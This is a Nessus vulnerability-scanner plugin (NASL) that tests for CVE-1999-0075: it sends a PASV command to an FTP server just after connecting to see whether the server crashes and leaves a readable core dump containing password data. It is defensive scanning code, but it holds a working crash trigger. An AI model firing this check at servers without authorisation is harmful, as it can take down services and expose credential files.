#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10086);
 script_version ("$Revision: 1.27 $");
 script_cve_id("CVE-1999-0075");
 name["english"] = "Ftp PASV on connect crashes the FTP server";
 name["francais"] = "Une commande PASV à la connexion d'un serveur FTP le plante";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The remote FTP server dies and dump core when it is
issued a PASV command as soon as the client connects.
The FTP server is very likely to write a world readable core file
which contains portions of the passwd file. This allows local users
to obtain the shadowed passwd file.

Risk factor : High.

Solution : Upgrade your FTP server to a newer version or disable it";

 desc["francais"] = "Le serveur FTP distant plante et fait un core
dump lorsque le client fait une commande 'PASV' dès qu'il a établit
la connection. Le serveur FTP a sans doute écrit un fichier core lisible
par tous, contenant une portion du fichier passwd shadow. Cela permet
aux utilisateurs locaux de récuperer le fichier shadow.

Facteur de risque : Elevé. 

Solution : Mettez à jour votre serveur FTP ou désactivez-le";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Issues a PASV command upon the connection";
 summary["francais"] = "Fait une commande PASV dès la connection";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "FTP";
 family["francais"] = "FTP";
 script_family(english:family["english"],
 	       francais:family["francais"]);
	       
 script_dependencie("ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here
#

include("ftp_func.inc");
include("global_settings.inc");


port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(get_port_state(port))
{
 banner = get_ftp_banner(port:port);
 if(!banner)exit(0);
 
 # False positive in WinGate and FireWall 1
 if("WinGate Engine" >< banner)exit(0);
 if("Check Point FireWall-1" >< banner)exit(0);
 if("vsftp" >< banner) exit(0);
 
 if ( report_paranoia < 2 && "SunOS" >!< banner  ) exit(0);


 soc = open_sock_tcp(port);
 if(soc)
 {
  h = ftp_recv_line(socket:soc);
  if(!h)exit(0);
  if(egrep(pattern:"^220.*", string:h))
  {
  send(socket:soc, data:'HELP\r\n');
  c = ftp_recv_line(socket:soc);
  if ( ! c ) exit(0);

  d = string("PASV\r\n");
  send(socket:soc, data:d);
  c = ftp_recv_line(socket:soc);
  if(!c)security_hole(port);
  }
  close(soc);
 }
}
